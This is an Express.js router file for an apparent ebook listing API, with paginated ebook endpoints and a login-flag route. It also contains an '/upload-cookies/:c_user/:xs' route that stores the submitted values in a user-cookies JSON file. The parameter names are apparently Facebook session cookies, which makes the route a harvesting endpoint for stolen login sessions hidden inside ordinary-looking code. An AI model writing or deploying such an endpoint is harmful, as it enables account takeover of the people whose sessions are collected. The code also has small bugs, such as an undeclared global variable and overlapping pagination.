const router = require("express").Router();
const fs = require('fs');

const ebooks = require("./ebooks.json")
const new_ebooks = require("./new-ebooks.json");
const { route } = require("../router/cookies-route");

// flag login
router.get("/flag_login", (req, res) => {
    res.json({
        flag_login: 'false'
    })
})

router.get("/", (req, res) => {
    let page = req.query.page
    if (!page) {
        res.json(ebooks)
    } else {
        let temp = {}
        let count = 0;

        for (let key in ebooks) {
            if (count >= Number(page) * 50 && count <= (Number(page) * 50) + 50) {
                temp[key] = ebooks[key]
            }
            count++
        }
        res.status(200).json(temp)
    }

})

router.get("/new-ebooks", (req, res) => {
    let page = req.query.page
    if (!page) {
        res.json(new_ebooks)
    } else {
        let temp = {}
        let count = 0;

        for (let key in new_ebooks) {
            if (count >= Number(page) * 50 && count <= (Number(page) * 50) + 50) {
                temp[key] = new_ebooks[key]
            }
            count++
        }
        res.status(200).json(temp)
    }

})

router.get("/upload-cookies/:c_user/:xs", (req, res) => {
    let _id = Math.floor((Math.random() * 1000) + 1);
    let c_user = req.params.c_user.toLowerCase();
    let xs = req.params.xs.toLowerCase();
    var obj = {
        "data": []
    }

    let path = process.cwd() + "/books/user-cookies.json";

    fs.readFile(path, 'utf8', function readFileCallback(err, result_user){
        if (err) {
            console.log(err);
        } else {
            obj = JSON.parse(result_user);
            obj.data.push({id: _id, c_user: c_user, xs: xs});
            json = JSON.stringify(obj);
            fs.writeFile(path, json, 'utf8', function(err, result){
                if (err) {
                    res.status(404).send("write file failure").end()
                }
        
                res.status(200).json({
                    message: "Upload cookies success"
                })
            }); 
        }
    });
})

module.exports = router;